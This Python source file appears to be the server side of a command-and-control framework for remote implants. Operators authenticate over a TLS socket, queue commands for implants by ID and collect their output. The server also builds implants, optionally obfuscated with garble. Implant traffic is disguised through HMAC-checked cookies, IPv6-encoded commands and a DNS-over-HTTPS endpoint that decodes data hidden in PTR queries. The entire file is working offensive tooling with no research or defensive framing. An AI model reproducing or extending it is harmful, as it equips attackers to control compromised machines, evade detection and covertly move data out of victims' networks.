import base64
from dnslib import QTYPE, DNSRecord, RR, A, PTR, RCODE
import dnslib
from urllib.parse import urlparse
import hashlib
import hmac
import json
import logging
import urllib
import zlib
import random
import socket
import ssl
import subprocess
import threading
import time
from queue import Queue, Empty
from threading import Thread
import secrets

from flask import Flask, request, jsonify, abort, Response

import ipv6_encoder
import pw_hash

app = Flask(__name__)
implant_checkout = {}

operator_session_tokens = set()

# Command queues for each implant identified by a 4-digit ID
implant_command_queues = {
    "1234": Queue(),
    "5678": Queue(),
}

# Result storage for each user
# Keeping this as a nested dict for now
result_storage = {
    """
    This is a nested dict for now
    The intention is that a user will interact with multiple implants
    Then to get the results from individual implants, they search for the implant key
    The value they get is the first element which can then be popped to move others up
    """
    "tester": [],
    "matt_tester": [],
}

# Logger configuration
logger = logging.getLogger(__name__)
logging.basicConfig(
    filename='server.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)


# Load the default config file
with open('s_conf.json', 'r') as file:
    config = json.load(file)

# Load the implant config file
with open('../Implant/shared/config.json', 'r') as file:
    imp_conf = json.load(file)

# Get the listener names from the config file and add them to a list
listeners_list = config["listeners"]
# Then form a dict with the listener name and their enabled state
route_status = {}
for listener in config["listeners"]:
    name = listener['name']
    path = listener['path']
    method = listener['method']
    # Ensure we only store the enabled/disabled status for each method on the same path
    if path not in route_status:
        route_status[path] = {}
    if name not in route_status[path]:
        route_status[path][name] = {}
    route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
print(route_status)


def find_get_val(req_meth):
    """
    A dirty function to search a dictionary for the method and status
    :param req_meth: The request method
    :return: Bool
    """
    stack = [route_status]

    while stack:
        current_dict = stack.pop()

        for key, value in current_dict.items():
            if isinstance(value, dict):
                stack.append(value)
            elif key == req_meth and value is False:
                return True
    return False


def endi_listener(listener_name, status):
    """
    Enable or disable a listener by name
    :param listener_name: The listener to set to True or False
    :param status: Set the listener to True/False
    :return: Bool
    """
    for search_path, listeners in route_status.items():
        for search_name, methods in listeners.items():
            if search_name == listener_name:
                for search_method in methods.keys():
                    # Update the method status to the given status
                    route_status[search_path][search_name][search_method] = status.lower() == "true"
                    return f"Listener {listener_name} set to {status} for {search_method} method."
    return f"Error: Listener {listener_name} not found."


def verify_auth_token(uri, received_token, received_timestamp):
    """
    Verifies HMAC auth tokens sent by clients to confirm authorization
    :param uri: The URI that the request came to
    :param received_token: The HMAC token sent with the request
    :param received_timestamp: The timestamp that the token was sent
    :return: bool depending on comparison outcome
    """
    # Get the value from the implant config json file
    secret_key = imp_conf["psk2"]
    time_window = 60  # Allow a 60-second window for token validity
    # Ensure the timestamp is within the allowed time window
    current_time = int(time.time())
    if abs(current_time - int(received_timestamp)) > time_window:
        logger.error("token past time window")
        return False

    # Recalculate the HMAC based on the URI and timestamp
    message = f"{uri}:{received_timestamp}"
    hmac_obj = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256)
    computed_token = hmac_obj.hexdigest()

    # Verify the token
    return hmac.compare_digest(computed_token, received_token)


def build_implant(protocol):
    """
    Builds an implant for the selected protocol
    :param protocol: The protocol to communicate over
    :return: bool depending on build success
    """
    logger.info("building implant")
    match protocol:
        case "http":
            try:
                result = subprocess.run(
                    ["make build EN_DNS=false"],
                    cwd='../Implant',
                    check=True,
                    capture_output=True,
                    text=True
                )
                logger.info("success building implant for HTTP")
                print(result)
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                logger.error(f"stdout: {e.stdout}")
                logger.error(f"stderr: {e.stderr}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False
        case "dns":
            try:
                result = subprocess.run(
                    ["make build EN_DNS=true"],
                    cwd='../Implant',
                    check=True,
                    capture_output=True,
                    text=True
                )
                logger.info("success building implant for DNS")
                print(result)
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                logger.error(f"stdout: {e.stdout}")
                logger.error(f"stderr: {e.stderr}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False
        case _:
            logger.error("no case match found")


def garble_implant(protocol):
    """
    Builds an implant using garble
    :param protocol: The protocol to communicate over
    :return: bool depending on build success
    """
    logger.info("building implant using garble")
    rand_num = random.randint(1000, 9999)
    match protocol:
        case "http":
            try:
                result = subprocess.run(
                    ["garble", "build", "-ldflags", f"-X main.CompUUID={rand_num}", "-tags", "http", "./http"],
                    cwd='../Implant',
                    check=True,
                    capture_output=True,
                    text=True
                )
                logger.info("success building")
                print(result)
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                logger.error(f"stdout: {e.stdout}")
                logger.error(f"stderr: {e.stderr}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False
        case _:
            logger.error("no case match found")


def add_user(new_user_id):
    """
    Adds a new user to the result storage dict
    :param new_user_id: The users ID to add
    :return: Nothing
    """
    logger.info(f"adding new user {new_user_id}")
    result_storage.setdefault(new_user_id, [])


def add_command(implant_id, operator, command):
    """
    Add a command to the implants queue
    :param implant_id: The implant ID to send the command to
    :param operator: The operator who set the command
    :param command: The command itself to be run
    :return: Nothing
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")
    else:
        logger.error(f"No queue found for implant {implant_id}, creating one")
        implant_command_queues.setdefault(implant_id, Queue())
        implant_command_queues[implant_id].put(command)
        logger.info(f"Added command for implant {implant_id}: {command}")


def get_results(user_id):
    """
    Get the users result storage
    :param user_id: The user ID to get the storage for
    :return: The results if any
    """
    fetched = str(result_storage.get(user_id, []))
    logger.info(f"got results {fetched}")
    result_storage.pop(user_id, 0)
    return fetched


def get_waiting_command(implant_id):
    """
    Gets the oldest command waiting in the implants queue
    :param implant_id: The implant ID to get the queue for
    :return: Either the operator name who set it and the command or False/False
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        try:
            operator, command = queue.get()
            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
            return operator, command
        except Empty:
            logger.info(f"No commands available for {implant_id}")
            return False, False
    else:
        logger.info(f"No queue found for {implant_id}")
        return False, False


def handle_update(uname, implant_id, result):
    """
    Handle implants sending results of commands to the server
    :param uname: The user who should get the results
    :param implant_id: The implant ID associated with the command
    :param result: The result sent by the implant
    :return: Boolean: True if success, otherwise returns error
    """
    try:
        # decoded_res = ipv6_encoder.ipv6_to_string(result)
        logger.info(f"first 10 bytes {result[:10]}")
        dict_store = {implant_id: result}
        result_storage.setdefault(uname, []).append(dict_store)
        logger.info(f"new result saved for user: {uname}")
        return True
    except Exception as e:
        logger.error(f"error occurred saving result for implant: {e}")
        return e


def checkout_command(imp_id, user_id):
    """
    Creates a queue that has the implant ID as the key and adds the user to it
    Informs the server who needs the latest result
    :param imp_id: The ID for the implant
    :param user_id: The ID for the user who sent the command
    :return:
    """
    implant_checkout.setdefault(imp_id, Queue())
    implant_checkout[imp_id].put(user_id)


def handle_client(client_socket):
    """
    Handles the client sending and retrieving info
    :param client_socket: The socket object the client uses to connect
    :return: Uses the client socket to send data, function returns nothing
    """
    try:
        # Receive the client's initial message
        client_request = client_socket.recv(1024).decode()

        # Check what type of message it is first before processing further
        request_type, *remainder = client_request.split(" ", 1)

        match request_type:
            case "AUTH":
                logger.info("authenticating user")
                request_type, uname, passwd = client_request.split(" ", 2)
                logger.info(f"checking authentication details for {uname}")
                if pw_hash.compare_hash(uname, passwd):
                    logger.info("user authenticated, generating session token")
                    returned_token = secrets.token_hex()
                    client_socket.send(returned_token.encode())
                    operator_session_tokens.add(returned_token)
                else:
                    client_socket.send("Bad username or password\n".encode())

            case "PUB":
                logger.info("request to send command, attempting")
                request_type, implant_id, uname, token, *command = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    command = command[0] if command else ""
                    add_command(implant_id, uname, command)
                    client_socket.send("Command queued\n".encode())
                    logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                else:
                    logger.error("bad token")
                    client_socket.send("Bad token\n".encode())

            case "RTR":
                logger.info("controller requesting implant last messages")
                request_type, uname, token, *message = client_request.split(" ", 3)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    results = get_results(uname)
                    client_socket.send(results.encode())
                    logger.info(f"sent controller results {results}")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case "BLD":
                logger.info("controller building new implant")
                request_type, uname, token, garbler, *message = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    if garbler == "y":
                        bld_status = garble_implant(message[0])
                        if bld_status is True:
                            client_socket.send("Garbling implant succeeded!".encode())
                        else:
                            client_socket.send("Garbling implant failed...".encode())
                    if garbler == "n":
                        bld_status = build_implant(message[0])
                        if bld_status is True:
                            client_socket.send("Building implant succeeded!".encode())
                        else:
                            client_socket.send("Building implant failed...".encode())
                    else:
                        client_socket.send("Not able to build, see log...".encode())
                        logger.error(f"unknown error occurred when trying to build {request_type} {uname} token"
                                     f" {garbler} {message[0]}")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case "RFR":
                logger.info("refreshing routes")
                request_type, uname, token, *message = client_request.split(" ", 3)
                if token in operator_session_tokens:
                    deregister_routes()
                    register_routes()
                    logger.info("refreshed routes")
                    client_socket.send(f"Routes refreshed".encode())
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token, couldn't refresh routes")

            case _:
                logger.error(f"unknown command: {request_type}")
                client_socket.send("Unknown command\n".encode())

    except Exception as e:
        logger.error(f"Error occurred when trying to receive connection: {e}")
        client_socket.send(f"Error: {e}\n".encode())
    finally:
        client_socket.close()


# Store a mapping of route functions so that they can be refreshed
route_functions = {}


def register_routes():
    """
    Dynamically register routes based on their enabled state
    Initial default route names are retrieved from the s_conf.json file
    """
    global route_functions

    @app.route(listeners_list[0]['path'], methods=['GET'])
    def def_endpoint1(path):
        """
        Verifies requests for commands with an HMAC and shared key
        :param path: This represents the implant ID
        :return: Either the waiting command or error
        """
        imp_psk1 = imp_conf["psk1"]
        logger.info("GET incoming for authenticated listener URI")
        try:
            logger.info("looks like an encoded request")
            # Get the cookie holding the encoded data
            url_decoded_data = request.cookies.get("da")
            logger.info("got cookies")
            url_decoded_data = url_decoded_data.rstrip("=")  # Remove existing padding
            padding = len(url_decoded_data) % 4
            if padding:
                url_decoded_data += "=" * (4 - padding)  # Add necessary padding

            compressed_data = base64.b64decode(url_decoded_data)
            decompressed_data = zlib.decompress(compressed_data)
            unparsed_query = decompressed_data.decode('utf-8')
            parsed_data = urllib.parse.parse_qs(unparsed_query)

            rcv_timestamp = parsed_data.get('timestamp')
            rcv_token = parsed_data.get('token')
            logger.info("got the token and timestamp from cookies")
            if verify_auth_token(path, rcv_token[0], rcv_timestamp[0]) is True:
                operator, command = get_waiting_command(path)
                if operator and command is False:
                    logger.error("operator and command in queue returned as false")
                    return "error"
                checkout_command(path, operator)
                command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                logger.info("sending command and HMAC to implant")
                hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
                hmac_sig = hmac_k.hexdigest()
                return jsonify(
                    message=command,
                    key=hmac_sig
                )
            else:
                logger.error(f"error: verify_auth_token failed")
                return "error"
        except Exception as e:
            logger.info(f"{e} occurred")
            rcv_timestamp = request.cookies.get('timestamp')
            rcv_token = request.cookies.get('token')
            if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
                operator, command = get_waiting_command(path)
                if operator and command is False:
                    logger.error("operator and command in queue returned as false")
                    return "error"
                checkout_command(path, operator)
                command = json.dumps(ipv6_encoder.string_to_ipv6(command))
                logger.info("sending command and HMAC to implant")
                hmac_k = hmac.new(imp_psk1.encode(), command.encode(), hashlib.sha256)
                hmac_sig = hmac_k.hexdigest()
                return jsonify(
                    message=command,
                    key=hmac_sig
                )
            else:
                logger.info("verifying auth failed")
                return 404


    @app.route(listeners_list[1]['path'], methods=['POST'])
    def def_endpoint2(path):
        try:
            logger.info(f"{path} sending us data")
            # Get the data
            result = request.get_json()
            # The result comes in as a JSON object under the field msg
            result = result.get("msg")
            # Check which operator is waiting for a result
            queue = implant_checkout[path]
            logger.info("got queue for operator")
            operator = queue.get()
            logger.info(f"sending {operator} command")
            handle_update(operator, path, result)
            return "200"
        except Exception as e:
            logger.error(f"error getting data: {e}")
            return "error"

    # Save the function references
    route_functions[listeners_list[0]['name']] = def_endpoint1
    route_functions[listeners_list[1]['name']] = def_endpoint2


# Register routes initially
register_routes()


def deregister_routes():
    """Deregister all currently registered routes."""
    global route_functions
    routes_to_remove = list(route_functions.keys())

    # Iterate through all rules and remove them if their endpoint is in route_functions
    rules_to_remove = [
        rule for rule in app.url_map.iter_rules() if rule.endpoint in routes_to_remove
    ]

    for rule in rules_to_remove:
        app.view_functions.pop(rule.endpoint, None)
        logger.info(f"Route '{rule.endpoint}' at path '{rule.rule}' removed")

    # Clear stored route functions after deregistering them
    route_functions.clear()


@app.before_request
def restrict_routes():
    """Middleware to block disabled routes."""
    logger.info(f"checking if route is enabled: {request.path} {request.method}")
    # Check if the request path matches a disabled route
    if request.url_rule.rule in route_status:
        if find_get_val(request.method):
            logger.warning(f"disabled route accessed: {request.path} {request.method}")
            abort(404)  # Return a 404 if the route is disabled


@app.route('/dns-query', methods=['GET', 'POST'])
def doh_handler():
    # Decode the incoming DNS query
    if request.method == 'POST':
        dns_query = request.data
    elif request.method == 'GET':
        dns_query_base64 = request.args.get('dns')
        dns_query = base64.urlsafe_b64decode(dns_query_base64)
    name_list = []

    # Parse the DNS query using dnslib
    dns_packet = DNSRecord.parse(dns_query)
    header = dns_packet.header
    transaction_id = header.id  # Transaction ID

    # Create the response packet
    response_packet = DNSRecord(header)
    response_packet.header.id = transaction_id
    response_packet.header.qr = 1  # Query Response
    response_packet.header.aa = 1  # Authoritative Answer
    response_packet.header.ra = 1  # Recursion Available
    query = dns_packet.q
    qtype = QTYPE[query.qtype]  # Query type (e.g., A, PTR, etc.)

    # Iterate over all questions in the DNS query
    for question in dns_packet.questions:
        qname = question.qname  # Query name
        name_list.append(qname)

    # Add response based on query type
    if qtype == "PTR":
        # Handle reverse DNS (PTR) query
        decoded_list = []
        for in_name in name_list:
            decoded_text = ipv6_encoder.decode_ipv6_to_text(in_name.label)
            decoded_list.append(decoded_text.strip('\x00'))
        print(ipv6_encoder.ipv6_to_string(decoded_list))
        response_packet.add_answer(
            RR(rname=qname.label, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(b"example.com"))
        )
    else:
        # Unsupported query type
        response_packet.header.rcode = RCODE.NOTIMP  # Not implemented

    # Sending the response back
    response_data = response_packet.pack()
    # Convert bytearray to bytes
    response_data = bytes(response_data)
    logger.info(f"sending response: {response_data} {type(response_data)}")
    return Response(response_data, content_type="application/dns-message")


def start_flask():
    app.run()


def start_server():
    """
    Start the socket server and the flask server
    Run an infinite loop until cancelled to handle socket requests
    :return: Nothing
    """
    flask_thread = Thread(target=start_flask)
    flask_thread.start()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Bind to any available interface
    server.listen(5)
    server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_context.minimum_version = ssl.TLSVersion.TLSv1_3
    server_context.maximum_version = ssl.TLSVersion.TLSv1_3
    server_context.load_cert_chain(certfile="server.pem")
    server_context.verify_mode = ssl.CERT_NONE
    secure_socket = server_context.wrap_socket(
        server,
        server_side=True,
    )
    logger.info("TLS socket wrapped and starting on port 9999\n")

    while True:
        client_socket, addr = secure_socket.accept()
        logger.info(f"Accepted connection from: {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
